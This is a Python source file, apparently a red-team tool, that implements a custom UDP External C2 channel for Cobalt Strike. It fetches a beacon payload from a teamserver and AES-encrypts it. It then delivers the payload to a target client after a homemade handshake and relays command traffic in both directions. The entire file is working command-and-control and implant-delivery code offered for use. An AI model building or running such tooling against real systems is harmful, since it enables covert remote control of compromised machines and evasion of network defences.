"""
    server.py

    Program to provide basic UDP communications for Cobalt Strike using the External C2 feature.
"""
import argparse
import ipaddress
import socket
import struct
import sys
import time
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes


class SocketInfo:
    """
    @brief Class to hold info for TCP session
    """
    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, timeout, retries, key):
        """

        :param ts_ip: IP address of CS Teamserver
        :param ts_port: Port of CS Teamserver
        :param srv_ip: IP to bind to on server
        :param srv_port: Port of server to listen on
        :param pipe_str: String for named pipe on client
        :param timeout: The socket timeout option (in seconds)
        :param retries: The number of times to retry a recv
        :param key: The AES key to encrypt comms
        """
        if len(pipe_str) > 50:
            raise ValueError('pipe_str must be less than 50 characters')
        self.ts_ip = ts_ip
        self.ts_port = ts_port
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.pipe_str = pipe_str
        self.timeout = timeout
        self.retries = retries
        self.key = key


class ExternalC2Controller:
    def __init__(self, port):
        self.port = port
        self.packet_size = 1024         #Max payload size, must be same as in client.c. Note that actual payload sent will be packet_size+4.
        self.server_seqnum = 0
        self.client_seqnum = 0
        self.retries = 0

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len[0], body

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        if len(_len) == 0:
            print('connection to ts died. Exiting')
            exit(2)
        frame_length = struct.unpack("<I", _len)[0]
        while len(data) < frame_length:
            data += self._socketTS.recv(frame_length - len(data))
        return data


    # The sendToBeacon function sends a single UDP packet, then waits
    # for an ACK before sending more. If a timeout occurs, this funtion
    # resends the current packet. 
    def sendToBeacon(self, data):
        """
        
        :param data: Data to send to beacon
        """
        _retries = self.retries
        length = len(data)
        lenFrame = struct.pack("<2I", self.server_seqnum, length)
        while (_retries > 0):
            try:
                self._socketServer.sendto(lenFrame, self.clientAddr)
                ackFrame, addr = self._socketServer.recvfrom(3)
                if (addr != self.clientAddr):
                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                    ackMessage = ackFrame.decode(errors="replace")
                    if (ackMessage == "123"):
                        self.server_seqnum += 1
                        break
            except socket.timeout:
                _retries -= 1
                print("Socket timed out, retires left:{}".format(_retries))
            except Exception as e:
                print("Recv ack in sendToBeacon failed. Error: {}".format(e))
                return None
        if (_retries <= 0):
            print("No more retries, exiting")
            return None

        total = 0
        # Reset retries
        _retries = self.retries
        while (_retries > 0 and total < length):
            try:
                packetSentLength = 0
                sentPayload = (struct.pack("<I", self.server_seqnum) + data[total: (total+self.packet_size)])
                packetSentLength = self._socketServer.sendto(sentPayload, self.clientAddr)
                ackFrame, addr = self._socketServer.recvfrom(3)
                if (addr != self.clientAddr):
                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                    ackMessage = ackFrame.decode(errors="replace")
                    if (ackMessage == "123"):
                        total += packetSentLength - 4
                        self.server_seqnum += 1
                        continue
            except socket.timeout:
                _retries -= 1
                print("Socket timed out, retires left:{}".format(_retries))
            except Exception as e:
                print("Recv ack in sendToBeacon failed. Error: {}".format(e))
                return None
        if (_retries <= 0):
            print("No more retries, exiting")
            return None
                        


    # The receive function sends a generic ACK for every packet received
    # where the sequence number is less than or equal to the expected 
    # sequence number from the client. 
    def recvFromBeacon(self):
        """
        :return: data received from beacon
        """
        dataLength = -1
        _retries = self.retries
        recv_dataLength = None
        while (_retries > 0):
            try:
                recv_dataLength, addr = self._socketServer.recvfrom(8)
                if (addr != self.clientAddr):
                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                        # print("Received a packet")
                        seqnum = (struct.unpack("<I", recv_dataLength[0:4]))[0]
                        # print("Client seqnum expected: {}".format(self.client_seqnum))
                        # print("Client seqnum received: {}".format(seqnum))
                        if (self.ackIfCorrect(seqnum)):
                            dataLength = (struct.unpack("<I", recv_dataLength[4:8]))[0]
                            # print("Struct unpacked, length: {}".format(dataLength))
                            self.client_seqnum += 1
                            break
            except socket.timeout:
                _retries -= 1
                print("Socket timed out, retires left:{}".format(_retries))
            except Exception as e:
                print("Recv length in recvFromBeacon failed. Error: {}".format(e))
                return None
        if (_retries <= 0):
            print("No more retries, exiting")
            return None
        total = 0
        # Reset retries
        _retries = self.retries
        data = bytearray(dataLength)
        while (_retries > 0 and total < dataLength):
            try:
                dataChunk, addr = self._socketServer.recvfrom(self.packet_size+4)
                if (addr != self.clientAddr):
                        print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                else:
                    seqnum = (struct.unpack("<I", dataChunk[0:4]))[0]
                    # print("Client seqnum expected: {}".format(self.client_seqnum))
                    # print("Client seqnum received: {}".format(seqnum))
                    if (self.ackIfCorrect(seqnum)):
                        # print("Length of chunk: {}".format(len(dataChunk)))
                        # print("Total bytes received so far: {}".format(total))
                        # print("datalength - total: {}".format(dataLength - total))
                        if (dataLength - total < (len(dataChunk) - 4)):
                            data[total:dataLength] = dataChunk[4:(dataLength-total)]
                            total = dataLength
                        else:
                            data[total : (total+len(dataChunk)-4)] = dataChunk[4:]
                            total = (total + len(dataChunk)-4)
                        self.client_seqnum += 1
            except socket.timeout:
                _retries -= 1
                print("Socket timed out, retires left:{}".format(_retries))
            except Exception as e:
                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
                return None
        if (_retries <= 0):
            print("No more retries, exiting")
            return None
        return data

    def ackIfCorrect(self, seqnum):
        # print("Inside ackIfCorrect")
        output = False
        # Changed ACK to 123
        msg = "123".encode()
        if (seqnum == self.client_seqnum):
            # print("Seqnum correct")
            self._socketServer.sendto(msg, self.clientAddr)
            # print("ACK Sent")
            output = True
        elif (seqnum < self.client_seqnum):
            # print("Seqnum less than expected")
            self._socketServer.sendto(msg, self.clientAddr)
        return output

    

    def run(self, socketInfo, arch):
        """

        :param socketInfo: Class with user connection info
        """
        # Connecting to TS first, if we fail we do so before connecting to target irc server
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        try:
            self._socketTS.connect((socketInfo.ts_ip, socketInfo.ts_port))
        except:
            print("Teamserver connection failed. Exiting.")
            exit(1)
        
        # Send out config options
        self.send_to_ts("arch={}".format(arch).encode())
        self.send_to_ts("pipename={}".format(socketInfo.pipe_str).encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our target
        payload = self.recv_from_ts()

        # Now that we have our beacon to send, wait for a connection from our target
        self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socketServer.bind((socketInfo.srv_ip,socketInfo.srv_port))
        self.retries = socketInfo.retries
        print("Number of retries: {}".format(self.retries))
        connected = False
        while(not connected):
            #We get one: 
            try:
                data, clientAddr = self._socketServer.recvfrom(4)
            except socket.timeout:
                print("Socket timed out, looping..")
                continue
            except Exception as e:
                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
                return
            print("Connection from {}".format(clientAddr))
            self.client_seqnum = (struct.unpack("<I", data))[0]
            self.clientAddr = clientAddr
            self.client_seqnum += 1

            self._socketServer.settimeout(socketInfo.timeout)

            #Send my seqneunce number
            #If an ACK arrives, we are connected!
            #changed ACK to 123
            _retries = self.retries
            while (_retries > 0):
                try:
                    self._socketServer.sendto(struct.pack("<I", self.server_seqnum), self.clientAddr)
                    data, addr = self._socketServer.recvfrom(4)
                    if (addr != self.clientAddr):
                        print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                    else:
                        self.server_seqnum += 1
                        if (data.decode() != "123\x00"):
                            print("Error in 3-way handshake?")
                            print(data.decode(errors="replace"))
                            exit()
                        else:
                            connected = True
                            break
                except socket.timeout:
                    _retries -= 1
                    print("Socket timed out, retires left:{}".format(_retries))
                except Exception as e:
                    print("Recv ack in 3 way handshake failed. Error: {}".format(e))
                    return

            if (not connected):
                print("Failed 3-way handshake from {}".format(clientAddr))

        print("Handshake completed. Sending payload size {} to client.".format(len(payload)))  

        # Send iv and encrypted beacon payload to target
        cipher = AES.new((socketInfo.key).encode(), AES.MODE_CTR)
        ct_bytes = cipher.encrypt(payload)
        #nonce = b64encode(cipher.nonce).decode('utf-8')
        #ct = b64encode(ct_bytes).decode('utf-8')
        nonce = cipher.nonce
        ct = ct_bytes
        print("Nonce: {} \nCT: {}".format(nonce, ct))
        self.sendToBeacon(nonce)
        self.sendToBeacon(ct)

        #Wait for payload
        time.sleep(1)
        print("Start pipe dance")
        while True:
            data = self.recvFromBeacon()
            if data == None:
                print("Error/exit from beacon")
                break
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received %d bytes from TS and sending to beacon" % len(data))
            self.sendToBeacon(data)
        self._socketServer.close()
        self._socketTS.close()


parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                 usage="\n"
                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [TIMEOUT] [RETRIES] [KEY]"
                                       "\nUse '%(prog)s -h' for more information.")
parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
parser.add_argument('srv_ip', help="IP to bind to on server.")
parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
parser.add_argument('timeout', type=int, help="The socket timeout option (in seconds) set by settimeout()")
parser.add_argument('retries', type=int, help="Number of times to retry listening for a connection after a timeout occurs.")
parser.add_argument('key', help="AES key to encrypt the beacon that is initially sent. It must be the same as the client.")
parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
args = parser.parse_args()
controller = ExternalC2Controller(args.teamserver_port)
socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.timeout, args.retries, args.key)
while True:
    if(args.arch == 'x64'):
        print('Ensure client is x64!')
    controller.run(socketInfo, args.arch)
    if (args.restart == "N"):
        print("Exiting")
        break
    print('waiting 10s before reconnecting to TS')
    time.sleep(10)
